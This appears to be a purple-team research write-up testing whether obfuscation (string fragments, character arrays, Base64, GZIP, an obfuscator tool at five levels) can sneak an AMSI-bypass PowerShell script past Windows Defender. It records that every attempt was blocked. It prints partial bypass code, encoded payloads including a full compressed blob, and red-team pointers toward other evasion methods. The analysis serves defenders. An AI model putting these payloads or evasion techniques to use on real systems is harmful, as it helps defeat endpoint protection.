# AMSI Bypass Research: Obfuscation vs. Modern Defenses

Documentation of real-world AMSI bypass attempts using various obfuscation techniques against Windows 11 with Defender enabled.

**Research Date:** February 12, 2026  
**Environment:** Windows 11 Enterprise, Defender enabled, PowerShell 5.1  
**Target Script:** [ghostamsi.ps1](https://github.com/andreisss/Ghosting-AMSI)  
**Obfuscation Tool:** [PowerShell Obfuscator](https://github.com/TaurusOmar/psobf) (Levels 1-5)

---

## Executive Summary

Tested 5 progressive obfuscation levels plus manual encoding techniques against AMSI. **All attempts failed.** Key finding: AMSI automatically reverses common obfuscation methods (string concatenation, encoding, compression) and scans the deobfuscated payload in real-time.

---

## Attempt 1: String Fragmentation (Manual)

### Technique
Breaking the script into small string fragments to avoid static signature detection.

### Script Used
```powershell
$fragments = @('Add-Type -Typ','eDefinition',' @"
using S','ystem;
usin','g System.Ru','ntime.Inter','opServices;','

public cl','ass Mem {
   ','[DllImpo','rt("kernel3','2.dll")]
   ','public st','atic extern',' IntPtr Get','ProcAddress','(IntPtr hMo','dule, strin'...)

$script = $fragments -join ''
Invoke-Expression $script
```

### Result
**BLOCKED** at `Invoke-Expression`

```
This script contains malicious content and has been blocked by your antivirus software.
CategoryInfo: ParserError
FullyQualifiedErrorId: ScriptContainedMaliciousContent
```

### Analysis
- AMSI concatenates fragments before scanning
- Static signature triggers on complete `Add-Type` + `DllImport` + `VirtualProtect` pattern
- Fragment size/count irrelevant - always blocked at execution point

---

## Attempt 2: ASCII Character Array Encoding

### Technique
Encoding entire script as ASCII decimal values to evade text-based signatures.

### Script Used
```powershell
$obfuscated = $([char[]](65,100,100,45,84,121,112,101,32,45,84,121,112,101,68,101,102,105,110,105,116,105,111,110,32,64,34,10,117,115,105,110,103,32,83,121,115,116,101,109,59,10,117,115,105,110,103,32,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,73,110,116,101,114,111,112...))

Invoke-Expression $obfuscated
```

### Result
**BLOCKED** at `Invoke-Expression`

```
This script contains malicious content and has been blocked by your antivirus software.
```

### Analysis
- AMSI converts char array back to string automatically
- Scans reconstructed content, not the numeric encoding
- ASCII encoding provides zero evasion value

---

## Attempt 3: Base64 Encoding (Single-Step)

### Technique
Base64 encoding the payload in a single decode operation.

### Script Used
```powershell
$obfuscated = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwoKcHVibGljIGNsYXNzIE1lbSB7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0...'))
```

### Result
**BLOCKED** at variable assignment (before `Invoke-Expression`)

```
At line:1 char:1
+ $obfuscated = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64St ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
```

### Analysis
- AMSI intercepts at `FromBase64String()` call
- Decodes Base64 automatically during the operation
- Blocks BEFORE variable assignment completes
- Never reached execution stage

---

## Attempt 4: Base64 Encoding (Multi-Step)

### Technique
Splitting Base64 decode into separate variables to delay detection.

### Script Used
```powershell
$e = [Convert]::FromBase64String('QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAiCnVzaW5nIFN5c3RlbTsK...')
$obfuscated = [Text.Encoding]::UTF8.GetString($e)
Invoke-Expression $obfuscated
```

### Result
**BLOCKED** at first variable assignment

```
At line:1 char:1
+ $e = [Convert]::FromBase64String('QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEA ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked
```

### Analysis
- Multi-step approach provides no advantage
- AMSI scans each line independently
- Base64 decode operation itself triggers inspection
- Blocked at first decode, never reached subsequent steps

---

## Attempt 5: GZIP Compression + Base64

### Technique
Compressing payload with GZIP, then Base64 encoding the compressed stream.

### Script Used
```powershell
$compressed = 'H4sIAAAAAAAA/6xUYW/bNhD9zl9x0PxBQmVDTYKhsBGgjqKkBuIkiJ12qGEEtHSOuVKkRp0Su1v/+0BKseUgGbY1XwToyLt7fPfeDbOsO90UCO57ikuhBAmt4KPHqlKoe5hsSsJ8sPfXu6kUiRx7I0VodDFB8yBSLAeMFdVCihRSycsSxpjDnwwAYHYq5SgvtCHf+4ZGoTw86GVSesHcnTdpJXESKeCa0CgYKbomA+dI10anwywzWJZ+E12NdVZJDKEkY5EVRqeXPMdgwH6644Xm2YVYGG42flNe/WzphdYSPgtDFZfXRhOm9PQUWTRvC+G2CWWPE/EdQ6iEIljKS3xsckLQFdVhWSzllcyag7d4dwNvKKVO/z04d51b1VgNbcNvgcuRdiarcjVSJZkqtV1inq5wKwMrDYdui/eEl/gK5rcg6RwproxBRU1rPxiwH8z7yNgvEGtVEldUss718Dy5S35L4ttpcneTDE+/3IymCRxDtD6KWGecjO/iq/F4NHWh91HUBG+SSXLzub544KLXw2n86W4y+mqD7w9sn4ZzBDI8L7QUCvuQ6wdAvg4hGoBBYp1SfEc4hllDwrzf18Vdsi6kSAX5ddOAdXY17OUx5vN+f08Ks23+VzQ6BFc4hPYbugttoI0/hFcYCCz+ZC0IxLIFH/hWRrDkQmLGxBL8Nrgu/gH7UIJmvXwxgrCbGKMNeLPuHM5cBSD9VLbNVM9zSQapMor9sHhcAVhp/e0FGm3YMrPYEM7mcz9an3wIIVpH0cvf+DBgs3/elL0xN+WKy3m/H+ti47seIUQhtB4cggv3LlDd08rx5rwAYmcGSK0bWEeien3S+2WaCb9sq+bwBZE/hyZRBfAXXFXUvayktOjOkWBZqRoYry3IOlIsdrpqr1bPFKmho9p4rGMzdxefbX1bJQTvMjOxFKgo5lIeekGtEZf5v9TRaGO/7Av6uFVFvc6AuLlHghxzbTaso7cL2BqW7bvnac87gOGr09n5O3jVNSHMDC7nrX7Pya8lXHBKV7WGjdXwbmQD+D0vbLAxvGUWjttD7U31SNGvR37AOq7OvuiPnOhPPgTwDmYngmKtHtAQmnpaJxvC0t/Vdtd22WdnNjuJ/rs1HJTaGzWPdWRni3q+n3RJ4M3ezZ9Ns6YEM/Djs/NuyZftVRD0YDiejGAhhcpA6ceex/4OAAD///p+sIYUCQAA'

$bytes = [Convert]::FromBase64String($compressed)
$ms = New-Object IO.MemoryStream(,$bytes)
$gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
# ...decompression pipeline
```

### Result
**BLOCKED** at first line (GZIP header detection)

```
At line:1 char:1
+ $compressed = 'H4sIAAAAAAAA/6xUYW/bNhD9zl9x0PxBQmVDTYKhsBGgjqKkBuIkiJ ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked
```

### Analysis
- AMSI recognizes GZIP magic bytes in Base64 (`H4sI` = `1f 8b 08 00`)
- Automatically decodes Base64 AND decompresses GZIP
- Scans decompressed payload
- Blocked before any decompression code executed
- Multi-layer obfuscation actually INCREASES suspicion

---

## Attempt 6: PowerShell Obfuscator - Level 1

### Tool
[PowerShell Obfuscator](https://github.com/TaurusOmar/psobf) - String manipulation level

### Result
**BLOCKED** at variable assignment

### Analysis
- Automated string concatenation patterns
- AMSI recognizes obfuscation tool signatures
- Same failure mode as manual fragmentation

---

## Attempt 7: PowerShell Obfuscator - Level 2

### Tool
PowerShell Obfuscator - Encoding layers

### Result
**BLOCKED** at variable assignment

### Analysis
- Additional encoding layers provide no evasion
- AMSI reverses all encoding automatically
- Detection time unchanged from Level 1

---

## Attempt 8: PowerShell Obfuscator - Level 3

### Tool
PowerShell Obfuscator - Compression + encoding

### Result
**BLOCKED** before decompression

### Analysis
- Compression detected via magic bytes
- Automatic decompression by AMSI
- Blocked faster than uncompressed versions

---

## Attempt 9: PowerShell Obfuscator - Level 4

### Tool
PowerShell Obfuscator - Multi-layer obfuscation

### Result
**BLOCKED** (faster detection)

### Analysis
- Tool-specific patterns recognized
- Multiple layers flag higher suspicion
- Counter-productive for evasion

---

## Attempt 10: PowerShell Obfuscator - Level 5 (Maximum)

### Tool
PowerShell Obfuscator - Maximum obfuscation

### Result
**SYNTAX ERROR** (never reached AMSI)

```
Unrecognized token in source text.
ParserError: (:) [], ParentContainsErrorRecordException
```

### Analysis
- Extreme obfuscation broke PowerShell syntax
- XOR operations, variable renaming, nested encoding created invalid code
- PowerShell parser rejected before AMSI scan
- **Ultimate failure: code doesn't execute at all**

---

## Key Findings

### What AMSI Automatically Reverses
✅ **String concatenation** - Fragments rejoined before scanning  
✅ **Character arrays** - Converted back to strings  
✅ **Base64 encoding** - Decoded automatically  
✅ **GZIP compression** - Decompressed automatically  
✅ **Multi-stage encoding** - All layers reversed  
✅ **Automated obfuscation tools** - Pattern recognition  

### Detection Timeline
| Technique | Blocked At | AMSI Saw |
|-----------|-----------|----------|
| String fragmentation | `Invoke-Expression` | Concatenated script |
| ASCII encoding | `Invoke-Expression` | Decoded script |
| Base64 (single) | Variable assignment | Decoded script |
| Base64 (multi-step) | First assignment | Decoded script |
| GZIP + Base64 | Variable assignment | Decompressed script |
| Obfuscator L1-4 | Variable assignment | Deobfuscated script |
| Obfuscator L5 | Parse time | Syntax error |

### Why String Obfuscation Failed
1. **AMSI scans deobfuscated content** - Not the encoded wrapper
2. **Behavioral signatures** - `Add-Type` + `DllImport` + `VirtualProtect` = blocked
3. **Automatic deobfuscation** - All common encoding schemes reversed
4. **Pattern recognition** - Obfuscation tools follow predictable patterns

---

## Purple Team Value

### For Defenders
- **Trust AMSI for baseline protection** - String obfuscation requires no custom rules
- **Focus detection on advanced techniques** - In-memory patching, reflection, compiled binaries
- **Leverage built-in capabilities** - AMSI handles obfuscation automatically

### For Red Teams
- **String obfuscation is ineffective** - Provides zero evasion against modern AMSI
- **Automated tools are fingerprinted** - Known patterns trigger faster detection
- **Need different approach** - Reflection, syscalls, C# compilation, or AMSI bypass first

---

## Conclusion

Tested 10+ obfuscation variants against Windows Defender with AMSI enabled. **Success rate: 0%**

AMSI's automatic deobfuscation capabilities are far more sophisticated than commonly assumed. It doesn't just scan strings - it actively reverses encoding, decompression, and obfuscation in real-time before content execution.

**The uncomfortable truth:** If your evasion strategy is "encode it differently," you're not evading anything.

**Operational techniques remain operational.** 🔒

---

## References

- Target script: https://github.com/andreisss/Ghosting-AMSI
- Obfuscation tool: https://github.com/TaurusOmar/psobf
- Microsoft AMSI documentation: https://docs.microsoft.com/en-us/windows/win32/amsi/
- Related LinkedIn post: [AMSI Ate My Obfuscation Homework](https://www.linkedin.com/in/osherjacobs/)

---

**Research conducted in isolated lab environment for defensive analysis purposes.**
